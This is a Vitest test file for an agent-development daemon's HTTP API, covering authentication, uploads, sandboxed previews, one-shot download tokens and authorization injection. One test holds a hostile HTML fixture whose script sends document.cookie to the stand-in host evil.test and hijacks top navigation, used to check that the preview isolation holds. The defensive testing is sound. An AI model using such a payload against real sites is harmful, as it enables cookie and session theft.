import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { ARTIFACT_LIMITS, ATTACHMENT_LIMITS } from '@agentdev/contracts';
import { createDaemon, listen, parseMultipart } from '../src/index.js';
import {
  ArtifactService,
  AttachmentService,
  AuthService,
  DownloadTokenStore,
  PREVIEW_CSP,
  PREVIEW_SANDBOX,
} from '@agentdev/core';
import {
  BlobStore,
  ProjectStore as Store,
  projectIdFromRoot,
  type ProjectStore,
} from '@agentdev/storage';
import type { Server } from 'node:http';

const ROOT = '/tmp/agentdev-daemon-root';
const CONVERSATION_ID = '018f2c1e-9a4b-7c3d-8e5f-0a1b2c3d5f01';

describe('daemon HTTP surface (WP-03)', () => {
  let dataDir: string;
  let stateDir: string;
  let store: ProjectStore;
  let blobs: BlobStore;
  let attachments: AttachmentService;
  let artifacts: ArtifactService;
  let server: Server;
  let url: string;
  let close: () => Promise<void>;
  let token: string;
  let projectId: string;

  beforeEach(async () => {
    dataDir = mkdtempSync(join(tmpdir(), 'agentdev-daemon-'));
    stateDir = mkdtempSync(join(tmpdir(), 'agentdev-daemon-auth-'));
    store = Store.open({
      dataDir,
      canonicalRoot: ROOT,
      migrations: { backup: () => undefined, backupPath: join(dataDir, 'pre.sqlite') },
    });
    blobs = new BlobStore({ root: dataDir });
    attachments = new AttachmentService({ store, blobs });
    artifacts = new ArtifactService({ store, blobs });
    projectId = projectIdFromRoot(ROOT);
    store.projects.insert({
      id: projectId,
      root: ROOT,
      codeRoot: 'src',
      documentRoot: 'docs',
      deliveryBranch: 'agentdev/main',
      trust: 'trusted',
      state: 'open',
    });
    store.conversations.insert({
      id: CONVERSATION_ID,
      projectId,
      title: 'chief',
      archived: false,
    });
    const auth = AuthService.loadOrCreate({ stateDir });
    token = auth.createdToken as string;
    server = createDaemon({
      projectId,
      store,
      blobs,
      auth,
      attachments,
      artifacts,
      tokens: new DownloadTokenStore(),
      version: '0.0.0-test',
    });
    const started = await listen(server, { port: 0 });
    url = started.url;
    close = started.close;
  });

  afterEach(async () => {
    await close();
    store.close();
    rmSync(dataDir, { recursive: true, force: true });
    rmSync(stateDir, { recursive: true, force: true });
  });

  function authed(init: RequestInit = {}): RequestInit {
    return { ...init, headers: { authorization: `Bearer ${token}`, ...(init.headers ?? {}) } };
  }

  async function upload(content: string, mime = 'text/html', filename = 'note.html') {
    const form = new FormData();
    form.set('conversationId', CONVERSATION_ID);
    form.set('file', new Blob([content], { type: mime }), filename);
    return fetch(`${url}/artifacts/upload`, authed({ method: 'POST', body: form }));
  }

  it('answers /healthz without authentication and without leaking paths', async () => {
    const response = await fetch(`${url}/healthz`);
    expect(response.status).toBe(200);
    const body = (await response.json()) as Record<string, unknown>;
    expect(body).toEqual({ version: '0.0.0-test', ready: true });
    expect(JSON.stringify(body)).not.toContain(dataDir);
  });

  it('refuses unauthenticated requests (AC-084)', async () => {
    const response = await fetch(`${url}/artifacts/upload`, { method: 'POST' });
    expect(response.status).toBe(401);
    const wrong = await fetch(
      `${url}/artifacts/upload`,
      authed({ method: 'POST', headers: { authorization: 'Bearer nope' } }),
    );
    expect(wrong.status).toBe(401);
  });

  it('uploads, binds and previews an HTML explanation end to end (AC-002/AC-084)', async () => {
    const uploadResponse = await upload('<html><body><h1>explain</h1></body></html>');
    expect(uploadResponse.status).toBe(201);
    const uploaded = (await uploadResponse.json()) as { attachmentId: string; mime: string };
    expect(uploaded.mime).toBe('text/html');

    const send = await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json', 'idempotency-key': 'msg-1' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'please explain the routing rules as HTML',
          attachmentIds: [uploaded.attachmentId],
        }),
      }),
    );
    expect(send.status).toBe(202);
    const sent = (await send.json()) as { messageId: string; workId: string };
    expect(sent.workId).toMatch(/^[0-9a-f-]{36}$/u);

    // The Work exists, the attachment is bound and a user artifact was created.
    expect(store.works.find(sent.workId)).toMatchObject({ intent: 'assist', level: 'none' });
    expect(store.attachments.find(uploaded.attachmentId)).toMatchObject({
      state: 'bound',
      workId: sent.workId,
    });
    const userArtifacts = artifacts
      .list(sent.workId)
      .filter((artifact) => artifact.origin === 'user');
    expect(userArtifacts).toHaveLength(1);
    expect(
      store.events
        .readAfter(0, { limit: 100 })
        .filter((event) => event.name === 'message.received'),
    ).toHaveLength(1);

    // No Requirement or Gate was created by a plain question.
    expect(store.requirements.list()).toHaveLength(0);

    // The replayed send returns the original binding and creates nothing new.
    const replay = await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json', 'idempotency-key': 'msg-1' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'please explain the routing rules as HTML',
          attachmentIds: [uploaded.attachmentId],
        }),
      }),
    );
    expect(replay.status).toBe(202);
    expect(await replay.json()).toEqual(sent);
    expect(store.messages.list()).toHaveLength(1);

    // Preview carries the isolation policy, not the workbench cookie.
    const preview = await fetch(`${url}/artifacts/${userArtifacts[0]?.id ?? ''}/preview`, authed());
    expect(preview.status).toBe(200);
    expect(preview.headers.get('content-security-policy')).toBe(PREVIEW_CSP);
    expect(preview.headers.get('x-agentdev-preview-sandbox')).toBe(PREVIEW_SANDBOX);
    expect(preview.headers.get('x-agentdev-preview-credentials')).toBe('omit');
    expect(preview.headers.get('set-cookie')).toBeNull();
    expect(await preview.text()).toContain('explain');
  });

  it('serves a preview of a hostile document under the same isolation (AC-052)', async () => {
    const hostile =
      '<script>fetch("https://evil.test/"+document.cookie);parent.postMessage("x","*");' +
      'top.location="https://evil.test";</script>';
    const uploadResponse = await upload(hostile);
    const uploaded = (await uploadResponse.json()) as { attachmentId: string };
    await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'look at this',
          attachmentIds: [uploaded.attachmentId],
        }),
      }),
    );
    const artifact = store.artifacts.list({ where: 'origin = ?', params: ['user'] }).at(-1);
    if (artifact === undefined) throw new Error('no user artifact');
    const preview = await fetch(`${url}/artifacts/${artifact.id}/preview`, authed());
    expect(preview.status).toBe(200);
    const csp = preview.headers.get('content-security-policy') ?? '';
    const sandbox = preview.headers.get('x-agentdev-preview-sandbox') ?? '';
    // The attack vector is closed by policy: no network, no same-origin, no top
    // navigation and no parent access.
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("default-src 'none'");
    expect(sandbox).not.toContain('allow-same-origin');
    expect(sandbox).not.toContain('allow-top-navigation');
    expect(sandbox).not.toContain('allow-popups');
    expect(preview.headers.get('x-agentdev-preview-credentials')).toBe('omit');
  });

  it('rejects unsupported and oversized uploads server-side (AC-076)', async () => {
    const bad = await upload('binary', 'application/zip', 'app.zip');
    expect(bad.status).toBe(400);
    const badBody = (await bad.json()) as { error: { code: string } };
    expect(badBody.error.code).toBe('VALIDATION_ERROR');

    const huge = await upload('x'.repeat(ATTACHMENT_LIMITS.maxBytesEach + 1), 'text/plain');
    expect(huge.status).toBe(400);

    // A refused upload leaves no attachment row and no blob reference.
    expect(store.attachments.list()).toHaveLength(0);
  });

  it('consumes a download token once and then refuses it (AC-002)', async () => {
    const content = '<p>download me</p>';
    const uploadResponse = await upload(content, 'text/plain');
    const uploaded = (await uploadResponse.json()) as { attachmentId: string };
    const send = await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'download this',
          attachmentIds: [uploaded.attachmentId],
        }),
      }),
    );
    await send.json();
    const artifact = store.artifacts.list({ where: 'origin = ?', params: ['user'] }).at(-1);
    if (artifact === undefined) throw new Error('no user artifact');

    const prepare = await fetch(
      `${url}/artifacts/download.prepare`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ artifactId: artifact.id }),
      }),
    );
    expect(prepare.status).toBe(200);
    const grant = (await prepare.json()) as { downloadToken: string; expiresAt: string };
    expect(Date.parse(grant.expiresAt)).toBeGreaterThan(Date.now());

    const download = await fetch(`${url}/artifacts/download/${grant.downloadToken}`);
    expect(download.status).toBe(200);
    expect(download.headers.get('content-disposition')).toContain('attachment');
    expect(await download.text()).toBe(content);

    const replay = await fetch(`${url}/artifacts/download/${grant.downloadToken}`);
    expect(replay.status).toBe(403);
  });

  it('deletes only staged uploads and refuses bound ones (AC-084)', async () => {
    const uploadResponse = await upload('<p>x</p>', 'text/plain');
    const uploaded = (await uploadResponse.json()) as { attachmentId: string };
    const removed = await fetch(`${url}/artifacts/uploads/${uploaded.attachmentId}`, {
      method: 'DELETE',
      headers: { authorization: `Bearer ${token}` },
    });
    expect(removed.status).toBe(200);
    expect(store.attachments.find(uploaded.attachmentId)?.state).toBe('expired');

    const second = (await (await upload('<p>y</p>', 'text/plain')).json()) as {
      attachmentId: string;
    };
    await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'bound now',
          attachmentIds: [second.attachmentId],
        }),
      }),
    );
    const refused = await fetch(`${url}/artifacts/uploads/${second.attachmentId}`, {
      method: 'DELETE',
      headers: { authorization: `Bearer ${token}` },
    });
    expect(refused.status).toBe(400);
  });

  it('refuses a wrong signature, an unknown conversation and a foreign target Work', async () => {
    // A declared type that does not match the bytes is refused before storage.
    const mislabelled = await upload('%PDF-1.7 not really an image', 'image/png', 'fake.png');
    expect(mislabelled.status).toBe(400);
    expect(store.attachments.list()).toHaveLength(0);

    // An unknown conversation is NOT_FOUND, not a foreign-key crash.
    const form = new FormData();
    form.set('conversationId', '018f2c1e-9a4b-7c3d-8e5f-0a1b2c3d5f99');
    form.set('file', new Blob(['<p>x</p>'], { type: 'text/html' }), 'x.html');
    const orphan = await fetch(`${url}/artifacts/upload`, authed({ method: 'POST', body: form }));
    expect(orphan.status).toBe(404);
    expect(await orphan.text()).toContain('NOT_FOUND');

    // A follow-up may not target a Work created from another conversation.
    const elsewhere = '018f2c1e-9a4b-7c3d-8e5f-0a1b2c3d5f02';
    store.conversations.insert({
      id: elsewhere,
      projectId,
      title: 'other',
      archived: false,
    });
    const first = await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ conversationId: CONVERSATION_ID, body: 'first' }),
      }),
    );
    const sent = (await first.json()) as { workId: string };
    const wrongTarget = await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          conversationId: elsewhere,
          body: 'hijack',
          targetWorkId: sent.workId,
        }),
      }),
    );
    expect(wrongTarget.status).toBe(403);
  });

  it('keeps the inline preview inside both ceilings and reports validity', async () => {
    // A single 1 MiB+ line is truncated by bytes, not only by line count.
    const long = 'a'.repeat(ARTIFACT_LIMITS.inlinePreviewMaxBytes + 1_024);
    const uploadResponse = await upload(long, 'text/plain');
    const uploaded = (await uploadResponse.json()) as { attachmentId: string };
    await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'big',
          attachmentIds: [uploaded.attachmentId],
        }),
      }),
    );
    const artifact = store.artifacts.list({ where: 'origin = ?', params: ['user'] }).at(-1);
    if (artifact === undefined) throw new Error('no user artifact');
    const preview = await fetch(`${url}/artifacts/${artifact.id}/preview`, authed());
    expect(preview.status).toBe(200);
    const body = await preview.text();
    expect(Buffer.byteLength(body, 'utf8')).toBeLessThanOrEqual(
      ARTIFACT_LIMITS.inlinePreviewMaxBytes,
    );
    expect(preview.headers.get('x-agentdev-artifact-validity')).toBe('valid');
    // The client is told that the body is truncated and that a download is required.
    expect(preview.headers.get('x-agentdev-preview-mode')).toBe('truncated');
    expect(preview.headers.get('x-agentdev-preview-download-required')).toBe('true');

    // A string version is a bad request, never a silent fallback to the latest one.
    const badVersion = await fetch(
      `${url}/artifacts/download.prepare`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ artifactId: artifact.id, artifactVersion: '1' }),
      }),
    );
    expect(badVersion.status).toBe(400);
  });

  it('issues unguessable one-shot download tokens (W3-01)', async () => {
    const uploadResponse = await upload('<p>secret</p>', 'text/plain');
    const uploaded = (await uploadResponse.json()) as { attachmentId: string };
    await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'download',
          attachmentIds: [uploaded.attachmentId],
        }),
      }),
    );
    const artifact = store.artifacts.list({ where: 'origin = ?', params: ['user'] }).at(-1);
    if (artifact === undefined) throw new Error('no user artifact');
    const prepare = await fetch(
      `${url}/artifacts/download.prepare`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ artifactId: artifact.id }),
      }),
    );
    const grant = (await prepare.json()) as { downloadToken: string };
    // 256 bits of randomness, and the artifact id must not be derivable from the token.
    expect(grant.downloadToken.length).toBeGreaterThanOrEqual(43);
    expect(grant.downloadToken).not.toContain(artifact.id);
    // A guessed token is refused.
    const guessed = await fetch(`${url}/artifacts/download/${'a'.repeat(43)}`);
    expect(guessed.status).toBe(403);
  });

  it('never lets a client inject its own authorization (W3R3 review)', async () => {
    // The wire format has no authorization field: a question stays read-only even
    // when the client asks for write authority.
    const response = await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'explain the routing rules',
          authorization: {
            scope: {
              readPaths: ['packages/core/src'],
              writePaths: ['packages/core/src'],
              operations: ['edit'],
              networkTargets: [],
            },
            operations: ['edit'],
          },
        }),
      }),
    );
    expect(response.status).toBe(202);
    const sent = (await response.json()) as { workId: string; authorizationId: string | null };
    expect(sent.authorizationId).toBeNull();
    expect(store.works.find(sent.workId)?.scope.writePaths).toEqual([]);
    expect(store.authorizations.list()).toHaveLength(0);
  });

  it('reports every Work of a split message and the authorization it created', async () => {
    const response = await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'explain the routing rules and fix the typo in docs/INDEX.md',
        }),
      }),
    );
    expect(response.status).toBe(202);
    const sent = (await response.json()) as {
      workId: string;
      workIds: string[];
      authorizationId: string | null;
    };
    expect(sent.workIds).toHaveLength(2);
    expect(sent.authorizationId).not.toBeNull();
    // The authorization belongs to the delivery Work, never to the explanation.
    const authorized = store.authorizations.find(sent.authorizationId ?? '');
    const delivery = sent.workIds
      .map((id) => store.works.find(id))
      .find((work) => work?.intent === 'delivery');
    expect(authorized?.workId).toBe(delivery?.id);
    expect(delivery?.authorizationRef).toBe(sent.authorizationId);
  });

  it('refuses malformed work items and never rewrites an existing Work', async () => {
    const bad = await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'do something',
          workItems: [{ intent: 'operation', goal: 'deploy' }, null],
        }),
      }),
    );
    expect(bad.status).toBe(400);
    expect(store.works.list()).toHaveLength(0);

    // A follow-up into an existing Work must not change its level or authority.
    const first = await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ conversationId: CONVERSATION_ID, body: 'explain the rules' }),
      }),
    );
    const sent = (await first.json()) as { workId: string };
    const before = store.works.find(sent.workId);
    const followUp = await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'fix the typo in docs/INDEX.md',
          targetWorkId: sent.workId,
        }),
      }),
    );
    expect(followUp.status).toBe(202);
    const after = store.works.find(sent.workId);
    expect(after?.level).toBe(before?.level);
    expect(after?.authorizationRef).toBe(before?.authorizationRef);
    expect(store.authorizations.list()).toHaveLength(0);
  });

  it('parses multipart bodies without a framework dependency', () => {
    const boundary = 'agentdev-boundary';
    const body = Buffer.from(
      [
        `--${boundary}`,
        'Content-Disposition: form-data; name="conversationId"',
        '',
        CONVERSATION_ID,
        `--${boundary}`,
        'Content-Disposition: form-data; name="file"; filename="a.html"',
        'Content-Type: text/html',
        '',
        '<p>hi</p>',
        `--${boundary}--`,
        '',
      ].join('\r\n'),
      'utf8',
    );
    const parsed = parseMultipart(body, `multipart/form-data; boundary=${boundary}`);
    expect(parsed.fields['conversationId']).toBe(CONVERSATION_ID);
    expect(parsed.file?.mime).toBe('text/html');
    expect(parsed.file?.bytes.toString('utf8')).toBe('<p>hi</p>');
  });

  it('truncates a preview past the inline limit and keeps it downloadable (AC-002)', async () => {
    const long = Array.from(
      { length: ARTIFACT_LIMITS.inlinePreviewMaxLines + 50 },
      (_, i) => `line-${i}`,
    ).join('\n');
    const uploadResponse = await upload(long, 'text/plain');
    const uploaded = (await uploadResponse.json()) as { attachmentId: string };
    await fetch(
      `${url}/conversation.message.send`,
      authed({
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          conversationId: CONVERSATION_ID,
          body: 'long one',
          attachmentIds: [uploaded.attachmentId],
        }),
      }),
    );
    const artifact = store.artifacts.list({ where: 'origin = ?', params: ['user'] }).at(-1);
    if (artifact === undefined) throw new Error('no user artifact');
    const preview = await fetch(`${url}/artifacts/${artifact.id}/preview`, authed());
    expect(preview.status).toBe(200);
    expect((await preview.text()).split('\n')).toHaveLength(ARTIFACT_LIMITS.inlinePreviewMaxLines);
  });
});
